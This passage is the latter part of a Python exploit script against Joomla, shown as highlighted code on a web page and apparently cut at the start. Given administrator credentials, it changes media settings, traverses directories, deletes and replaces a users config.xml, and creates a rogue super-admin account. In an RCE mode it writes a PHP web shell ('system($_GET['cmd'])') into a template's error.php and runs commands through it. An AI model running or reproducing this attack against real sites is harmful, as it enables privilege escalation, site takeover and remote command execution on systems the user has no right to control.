    resp <span class="token operator">=</span> sess<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>proxies<span class="token operator">=</span>proxies<span class="token punctuation">)</span>
    <span class="token keyword">if</span> filename <span class="token keyword">not</span> <span class="token keyword">in</span> resp<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[!] Failed to upload file!&quot;</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[+] Exploit Successfully!&quot;</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token boolean">True</span>


<span class="token keyword">def</span> <span class="token function">set_users_option</span><span class="token punctuation">(</span>sess<span class="token punctuation">,</span> url<span class="token punctuation">,</span> token<span class="token punctuation">)</span><span class="token punctuation">:</span>
    newdata <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">&#39;jform[allowUserRegistration]&#39;</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span>
        <span class="token string">&#39;jform[new_usertype]&#39;</span><span class="token punctuation">:</span> <span class="token number">8</span><span class="token punctuation">,</span>
        <span class="token string">&#39;jform[guest_usergroup]&#39;</span><span class="token punctuation">:</span> <span class="token number">8</span><span class="token punctuation">,</span>
        <span class="token string">&#39;jform[sendpassword] &#39;</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span>
        <span class="token string">&#39;jform[useractivation]&#39;</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span>
        <span class="token string">&#39;jform[mail_to_admin]&#39;</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span>
        <span class="token string">&#39;id&#39;</span><span class="token punctuation">:</span> <span class="token number">25</span><span class="token punctuation">,</span>
        <span class="token string">&#39;component&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;com_users&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;task&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;config.save.component.apply&#39;</span><span class="token punctuation">,</span>
        token<span class="token punctuation">:</span> <span class="token number">1</span>
    <span class="token punctuation">}</span>
    newdata<span class="token punctuation">[</span><span class="token string">&#39;task&#39;</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">&#39;config.save.component.apply&#39;</span>
    config_url <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string">&#39;/administrator/index.php?option=com_config&#39;</span>
    resp <span class="token operator">=</span> sess<span class="token punctuation">.</span>post<span class="token punctuation">(</span>config_url<span class="token punctuation">,</span> data<span class="token operator">=</span>newdata<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token string">&#39;Configuration saved.&#39;</span> <span class="token keyword">not</span> <span class="token keyword">in</span> resp<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;[!] Could not save data. Error: Save not permitted.&#39;</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span>
    <span class="token keyword">return</span> <span class="token boolean">True</span>


<span class="token keyword">def</span> <span class="token function">create_superuser</span><span class="token punctuation">(</span>sess<span class="token punctuation">,</span> url<span class="token punctuation">,</span> username<span class="token punctuation">,</span> password<span class="token punctuation">,</span> email<span class="token punctuation">)</span><span class="token punctuation">:</span>
    resp <span class="token operator">=</span> sess<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">&quot;/index.php?option=com_users&amp;view=registration&quot;</span><span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
    token <span class="token operator">=</span> extract_token<span class="token punctuation">(</span>resp<span class="token punctuation">)</span>
    data <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token comment"># Form data</span>
        <span class="token string">&#39;jform[name]&#39;</span><span class="token punctuation">:</span> username<span class="token punctuation">,</span>
        <span class="token string">&#39;jform[username]&#39;</span><span class="token punctuation">:</span> username<span class="token punctuation">,</span>
        <span class="token string">&#39;jform[password1]&#39;</span><span class="token punctuation">:</span> password<span class="token punctuation">,</span>
        <span class="token string">&#39;jform[password2]&#39;</span><span class="token punctuation">:</span> password<span class="token punctuation">,</span>
        <span class="token string">&#39;jform[email1]&#39;</span><span class="token punctuation">:</span> email<span class="token punctuation">,</span>
        <span class="token string">&#39;jform[email2]&#39;</span><span class="token punctuation">:</span> email<span class="token punctuation">,</span>
        <span class="token string">&#39;jform[option]&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;com_users&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;jform[task]&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;registration.register&#39;</span><span class="token punctuation">,</span>
        token<span class="token punctuation">:</span> <span class="token string">&#39;1&#39;</span><span class="token punctuation">,</span>
    <span class="token punctuation">}</span>
    url_post <span class="token operator">=</span> <span class="token string">&quot;/index.php/component/users/?task=registration.register&amp;Itemid=101&quot;</span>
    sess<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url <span class="token operator">+</span> url_post<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
    sess<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">&quot;/administrator/index.php?option=com_login&amp;task=logout&amp;&quot;</span> <span class="token operator">+</span> token <span class="token operator">+</span> <span class="token string">&quot;=1&quot;</span><span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
    newsess <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> try_admin_login<span class="token punctuation">(</span>newsess<span class="token punctuation">,</span> url<span class="token punctuation">,</span> username<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">&quot;[+] Now, you are super-admin!!!!!!!!!!!!!!!!&quot;</span> <span class="token operator">+</span> <span class="token string">&quot;\\n[+] Your super-admin account: \\n[+] USERNAME: &quot;</span> <span class="token operator">+</span> username <span class="token operator">+</span> <span class="token string">&quot;\\n[+] PASSWORD: &quot;</span> <span class="token operator">+</span> password<span class="token punctuation">)</span>
        <span class="token keyword">return</span> newsess
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">&quot;[-] Sorry,exploit fail!&quot;</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token boolean">None</span>


<span class="token keyword">def</span> <span class="token function">setOption</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> sess<span class="token punctuation">,</span> usuper<span class="token punctuation">,</span> psuper<span class="token punctuation">,</span> esuper<span class="token punctuation">,</span> token<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">&quot;Superadmin Creation:&quot;</span><span class="token punctuation">)</span>
    <span class="token comment">#  folder contains config.xml</span>
    <span class="token builtin">dir</span> <span class="token operator">=</span> <span class="token string">&#39;./administrator/components/com_users&#39;</span>
    filename <span class="token operator">=</span> <span class="token string">&#39;config.xml&#39;</span>
    set_media_options<span class="token punctuation">(</span>url<span class="token punctuation">,</span> sess<span class="token punctuation">,</span> <span class="token builtin">dir</span><span class="token punctuation">,</span> token<span class="token punctuation">)</span>
    traversal<span class="token punctuation">(</span>sess<span class="token punctuation">,</span> url<span class="token punctuation">)</span>
    removeFile<span class="token punctuation">(</span>sess<span class="token punctuation">,</span> url<span class="token punctuation">,</span> filename<span class="token punctuation">,</span> token<span class="token punctuation">)</span>
    f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">&quot;config.xml&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;rb&quot;</span><span class="token punctuation">)</span>
    upload_file<span class="token punctuation">(</span>sess<span class="token punctuation">,</span> url<span class="token punctuation">,</span> f<span class="token punctuation">,</span> token<span class="token punctuation">)</span>
    set_users_option<span class="token punctuation">(</span>sess<span class="token punctuation">,</span> url<span class="token punctuation">,</span> token<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">rce</span><span class="token punctuation">(</span>sess<span class="token punctuation">,</span> url<span class="token punctuation">,</span> cmd<span class="token punctuation">,</span> token<span class="token punctuation">)</span><span class="token punctuation">:</span>
    filename <span class="token operator">=</span> <span class="token string">&#39;error.php&#39;</span>
    shlink <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string">&#39;/administrator/index.php?option=com_templates&amp;view=template&amp;id=506&amp;file=506&amp;file=L2Vycm9yLnBocA%3D%3D&#39;</span>
    shdata_up <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">&#39;jform[source]&#39;</span><span class="token punctuation">:</span> <span class="token string">&quot;&lt;?php echo &#39;Hacked by HK\\n&#39; ;system($_GET[&#39;cmd&#39;]); ?&gt;&quot;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;task&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;template.apply&#39;</span><span class="token punctuation">,</span>
        token<span class="token punctuation">:</span> <span class="token string">&#39;1&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;jform[extension_id]&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;506&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;jform[filename]&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;/&#39;</span> <span class="token operator">+</span> filename
    <span class="token punctuation">}</span>
    sess<span class="token punctuation">.</span>post<span class="token punctuation">(</span>shlink<span class="token punctuation">,</span> data<span class="token operator">=</span>shdata_up<span class="token punctuation">,</span>proxies<span class="token operator">=</span>proxies<span class="token punctuation">)</span>
    path2shell <span class="token operator">=</span> <span class="token string">&#39;/templates/protostar/error.php?cmd=&#39;</span> <span class="token operator">+</span> cmd
    <span class="token comment"># print &#39;[+] Shell is ready to use: &#39; + str(path2shell)</span>
    <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">&#39;[+] Checking:&#39;</span><span class="token punctuation">)</span>
    shreq <span class="token operator">=</span> sess<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> path2shell<span class="token punctuation">,</span>proxies<span class="token operator">=</span>proxies<span class="token punctuation">)</span>
    shresp <span class="token operator">=</span> shreq<span class="token punctuation">.</span>text
    <span class="token keyword">print</span> <span class="token punctuation">(</span>shresp <span class="token operator">+</span> <span class="token string">&#39;[+] Shell link: \\n&#39;</span> <span class="token operator">+</span> <span class="token punctuation">(</span>url <span class="token operator">+</span> path2shell<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">&#39;[+] Module finished.&#39;</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># Construct the argument parser</span>
    ap <span class="token operator">=</span> argparse<span class="token punctuation">.</span>ArgumentParser<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token comment"># Add the arguments to the parser</span>
    ap<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&quot;-url&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;--url&quot;</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
                    <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&quot; URL for your Joomla target&quot;</span><span class="token punctuation">)</span>
    ap<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&quot;-u&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;--username&quot;</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
                    <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&quot;username&quot;</span><span class="token punctuation">)</span>
    ap<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&quot;-p&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;--password&quot;</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
                    <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&quot;password&quot;</span><span class="token punctuation">)</span>
    ap<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&quot;-dir&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;--directory&quot;</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token string">&#39;./&#39;</span><span class="token punctuation">,</span>
                    <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&quot;directory&quot;</span><span class="token punctuation">)</span>
    ap<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&quot;-rm&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;--remove&quot;</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span>
                    <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&quot;filename&quot;</span><span class="token punctuation">)</span>
    ap<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&quot;-rce&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;--rce&quot;</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token string">&quot;0&quot;</span><span class="token punctuation">,</span>
                    <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&quot;RCE&#39;s mode is 1 to turn on&quot;</span><span class="token punctuation">)</span>
    ap<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&quot;-cmd&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;--command&quot;</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token string">&quot;whoami&quot;</span><span class="token punctuation">,</span>
                    <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&quot;command&quot;</span><span class="token punctuation">)</span>
    ap<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&quot;-usuper&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;--usernamesuper&quot;</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token string">&quot;hk&quot;</span><span class="token punctuation">,</span>
                    <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&quot;Super&#39;s username&quot;</span><span class="token punctuation">)</span>
    ap<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&quot;-psuper&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;--passwordsuper&quot;</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token string">&quot;12345678&quot;</span><span class="token punctuation">,</span>
                    <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&quot;Super&#39;s password&quot;</span><span class="token punctuation">)</span>
    ap<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&quot;-esuper&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;--emailsuper&quot;</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token string">&quot;hk@hk.com&quot;</span><span class="token punctuation">,</span>
                    <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&quot;Super&#39;s Email&quot;</span><span class="token punctuation">)</span>
    args <span class="token operator">=</span> <span class="token builtin">vars</span><span class="token punctuation">(</span>ap<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token comment"># target</span>
    url <span class="token operator">=</span> <span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token string">&#39;url&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">&#39;[+] Your target: &#39;</span> <span class="token operator">+</span> url<span class="token punctuation">)</span>
    <span class="token comment"># username</span>
    uname <span class="token operator">=</span> <span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token string">&#39;username&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token comment"># password</span>
    upass <span class="token operator">=</span> <span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token string">&#39;password&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token comment"># directory</span>
    <span class="token builtin">dir</span> <span class="token operator">=</span> <span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token string">&#39;directory&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token comment"># init</span>
    sess <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token comment"># admin login</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>try_admin_login<span class="token punctuation">(</span>sess<span class="token punctuation">,</span> url<span class="token punctuation">,</span> uname<span class="token punctuation">,</span> upass<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span> sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token comment"># get token</span>
    token <span class="token operator">=</span> check_admin<span class="token punctuation">(</span>sess<span class="token punctuation">,</span> url<span class="token punctuation">)</span>
    <span class="token comment"># set options</span>
    set_media_options<span class="token punctuation">(</span>url<span class="token punctuation">,</span> sess<span class="token punctuation">,</span> <span class="token builtin">dir</span><span class="token punctuation">,</span> token<span class="token punctuation">)</span>
    <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">&quot;Directory mode:&quot;</span><span class="token punctuation">)</span>
    traversal<span class="token punctuation">(</span>sess<span class="token punctuation">,</span> url<span class="token punctuation">)</span>
    <span class="token keyword">if</span> ap<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>remove<span class="token punctuation">:</span>
        <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">&quot;\\nRemove file mode: &quot;</span><span class="token punctuation">)</span>
        filename <span class="token operator">=</span> <span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token string">&#39;remove&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        removeFile<span class="token punctuation">(</span>sess<span class="token punctuation">,</span> url<span class="token punctuation">,</span> filename<span class="token punctuation">,</span> token<span class="token punctuation">)</span>
    <span class="token comment"># check option superadmin creation</span>
    <span class="token comment"># username of superadmin</span>
    usuper <span class="token operator">=</span> <span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token string">&#39;usernamesuper&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token comment"># password of superadmin</span>
    psuper <span class="token operator">=</span> <span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token string">&#39;passwordsuper&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token comment"># email of superadmin</span>
    esuper <span class="token operator">=</span> <span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token string">&#39;emailsuper&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token comment"># RCE mode</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token string">&#39;rce&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">&quot;1&quot;</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">&quot;\\nRCE mode:\\n&quot;</span><span class="token punctuation">)</span>
        <span class="token comment"># command</span>
        filename<span class="token operator">=</span><span class="token string">&quot;config.xml&quot;</span>
        writeConfigFile<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
        command <span class="token operator">=</span> <span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token string">&#39;command&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        setOption<span class="token punctuation">(</span>url<span class="token punctuation">,</span> sess<span class="token punctuation">,</span> usuper<span class="token punctuation">,</span> psuper<span class="token punctuation">,</span> esuper<span class="token punctuation">,</span> token<span class="token punctuation">)</span>
         <span class="token comment"># superadmin creation</span>
        newsess <span class="token operator">=</span> create_superuser<span class="token punctuation">(</span>sess<span class="token punctuation">,</span> url<span class="token punctuation">,</span> usuper<span class="token punctuation">,</span> psuper<span class="token punctuation">,</span> esuper<span class="token punctuation">)</span>
        <span class="token keyword">if</span> newsess <span class="token operator">!=</span> <span class="token boolean">None</span> <span class="token punctuation">:</span>
            <span class="token comment"># get token</span>
            newtoken <span class="token operator">=</span> check_admin<span class="token punctuation">(</span>newsess<span class="token punctuation">,</span> url<span class="token punctuation">)</span>
            rce<span class="token punctuation">(</span>newsess<span class="token punctuation">,</span> url<span class="token punctuation">,</span> command<span class="token punctuation">,</span> newtoken<span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">&quot;__main__&quot;</span><span class="token punctuation">:</span>
    sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div 